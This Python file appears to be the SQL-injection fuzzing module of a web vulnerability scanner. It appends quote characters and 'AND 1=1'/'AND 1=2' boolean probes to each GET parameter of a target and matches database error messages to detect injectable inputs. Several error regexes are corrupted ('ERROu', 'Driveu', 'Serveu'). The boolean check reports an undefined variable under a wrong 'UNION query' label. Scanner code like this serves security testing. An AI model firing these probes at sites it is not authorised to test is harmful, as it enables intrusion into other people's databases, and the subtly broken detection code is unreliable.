# coding:utf-8
"""
 * @id       PlayWeb-2014-3-28
 * @desc     fuzzing-sqli module
 * @author   Yaseng  WwW.Yaseng.Me [Yaseng@UAUC.NET]
 * @project  github.com/yaseng/playweb
"""
import  itertools, re, random, util
from http import Url, GetRequest, PostRequest
 
SQL_PREFIXES = (" ", ") ", "' ", "') ", "\"") 
SQL_SUFFIXES = ("", "-- ", "#", "%%00", "%%16")
SQL_POCS = ("'", '(', ')', '"') 
SQL_BOOLEAN_TESTS = "And 1=1"
 
SQLI_ERROR_SINGS = {
    "MySQL": (u"SQL syntax.*MySQL", u"Warning.*mysql_.*", u"valid MySQL result", u"MySqlClient\."),
    "PostgreSQL": (u"PostgreSQL.*ERROu", u"Warning.*\Wpg_.*", u"valid PostgreSQL result", u"Npgsql\."),
    "Microsoft SQL Server": (u"Driver.* SQL[\-\_\ ]*Serveu", u"OLE DB.* SQL Serveu", u"(\W|\A)SQL Server.*Driveu", u"Warning.*mssql_.*", u"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", u"(?s)Exception.*\WSystem\.Data\.SqlClient\.", u"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (u"Microsoft Access Driveu", u"JET Database Engine", u"Access Database Engine"),
    "Oracle": (u"ORA-[0-9][0-9][0-9][0-9]", u"Oracle errou", u"Oracle.*Driveu", u"Warning.*\Woci_.*", u"Warning.*\Wora_.*")
    }
    
 
def  exploit(request):
    if not request.url.params:
        return
    for param  in request.url.params:  # only  get
        for poc in SQL_POCS:
            injectable = False
            req_tmp = request.copy()
            req_tmp.__class__ = GetRequest
            req_tmp.setParam(param, req_tmp.getParam(param) + poc)
            for (dbms, regex) in ((dbms, regex) for dbms in SQLI_ERROR_SINGS for regex in SQLI_ERROR_SINGS[dbms]):
                if    re.search(regex, req_tmp.fetch(), re.I):
                    # print "%s" % req_tmp
                    util.report({"type":"sqli", "content":util.json_encode({"sqli_type":"%s Error Based" % dbms, "param":param, "detail":"%s" % req_tmp})})
                    return  
        for prefix, suffix in itertools.product(SQL_PREFIXES, SQL_SUFFIXES):
            poc1 = "%s AND 1=1 %s" % (prefix, suffix)
            poc2 = "%s AND 1=2 %s" % (prefix, suffix)
            req_tmp1 = request.copy()
            req_tmp1.__class__ = GetRequest
            req_tmp1.setParam(param, req_tmp1.getParam(param) + poc1)
            req_tmp2 = request.copy()
            req_tmp2.__class__ = GetRequest
            req_tmp2.setParam(param, req_tmp2.getParam(param) + poc2)
            if (len(req_tmp1.fetch()) != len(req_tmp2.fetch())):
            	util.report({"type":"sqli", "content":util.json_encode({"sqli_type":"UNION query", "param":param, "detail":"%s" % req_tmp})})
                # print "UNION SQLI:param %s %s"  % (param,req_tmp2)
                return
                
            
            
            
            
            
            
